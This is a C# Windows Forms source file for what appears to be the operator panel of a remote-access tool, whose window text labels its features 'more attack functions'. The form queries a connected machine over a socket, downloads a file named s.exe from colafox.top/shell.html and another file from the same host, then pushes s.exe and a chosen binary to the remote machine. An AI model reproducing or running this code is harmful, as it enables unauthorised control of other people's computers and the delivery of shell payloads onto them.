using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class AdvanceFunction : Form
    {
        public Socket socks;

        public void aloadth()
        {
            try
            {
                button3.Enabled = false;
                checkBox4.Enabled = false;
                this.Text = "请稍后 正在获取一些信息";
                socks.Send(Encoding.UTF8.GetBytes("EE"));

                byte[] data = new byte[4096];
                socks.Receive(data);

                string allrec = Encoding.UTF8.GetString(data);

                List<string> list = new List<string>(allrec.Split(','));
                label11.Text = list[0]; label12.Text = list[1];
                label13.Text = list[2]; label14.Text = list[3];
                label15.Text = list[4]; label16.Text = list[5];
                this.Text = "正在下载组件";

                try
                {
                    var url = "https://colafox.top/sch.html";
                    var save = @"fuckt";
                    if (!File.Exists(save))
                    {
                        this.Text = ("文件不存在，开始下载...");
                        using (var web = new WebClient())
                        {
                            web.DownloadFile(url, save);
                        }
                    }
                    this.Text = ("文件下载成功，下载第二个文件");

                    url = "https://colafox.top/shell.html";
                    save = @"s.exe";
                    if (!File.Exists(save))
                    {
                        this.Text = ("文件不存在，开始下载...");
                        using (var web = new WebClient())
                        {
                            web.DownloadFile(url, save);
                        }
                    }
                    this.Text = ("文件下载成功");

                    checkBox4.Enabled = true;
                    button3.Enabled = true;

                    Thread.Sleep(500);
                    this.Text = ("更多攻击功能");
                }
                catch
                {
                    label4.Text = ("下载失败！ 重新下载");
                }
            }
            catch(Exception e)
            {
                MessageBox.Show("你可能没有刷新" + e.ToString(), "连接失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
        }

        public AdvanceFunction()
        {
            InitializeComponent();
        }

        private void AdvanceFunction_Load(object sender, EventArgs e)
        {
            Thread th = new Thread(aloadth);
            th.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true) socks.Send(Encoding.UTF8.GetBytes("QA"));
            if (checkBox2.Checked == true) socks.Send(Encoding.UTF8.GetBytes("QB"));
            if (checkBox4.Checked == true) socks.Send(Encoding.UTF8.GetBytes("QD"));
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("还没写");
        }

        private void AdvanceFunction_DragDrop(object sender, DragEventArgs e)
        {
            string path = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();       //获得路径
            richTextBox1.Text = path;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            socks.Send(Encoding.UTF8.GetBytes("Us.exe"));
            try
            {
                FileStream fs = new FileStream("s.exe", FileMode.Open);
                long contentLength = fs.Length;
                socks.Send(BitConverter.GetBytes(contentLength));
                while (true)
                {
                    byte[] bits = new byte[128];
                    int r = fs.Read(bits, 0, bits.Length);
                    if (r <= 0) break;
                    socks.Send(bits, r, SocketFlags.None);
                }
                fs.Position = 0;

                fs.Close();
            }
            catch
            {
                richTextBox1.Text = "出现异常";
            }

            Thread.Sleep(1500);

            socks.Send(Encoding.UTF8.GetBytes("Us.bin"));
            try
            {
                FileStream fs = new FileStream(richTextBox1.Text, FileMode.Open);
                long contentLength = fs.Length;
                socks.Send(BitConverter.GetBytes(contentLength));
                while (true)
                {
                    byte[] bits = new byte[128];
                    int r = fs.Read(bits, 0, bits.Length);
                    if (r <= 0) break;
                    socks.Send(bits, r, SocketFlags.None);
                }
                fs.Position = 0;

                fs.Close();
            }
            catch
            {
                richTextBox1.Text = "出现异常";
            }

            Thread.Sleep(1500);
            socks.Send(Encoding.UTF8.GetBytes("ZZ"));
        }

        private void AdvanceFunction_DragEnter(object sender, DragEventArgs e)
        {
            string file = ((System.Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString();//获得路径
            richTextBox1.Text = file;
        }
    }
}
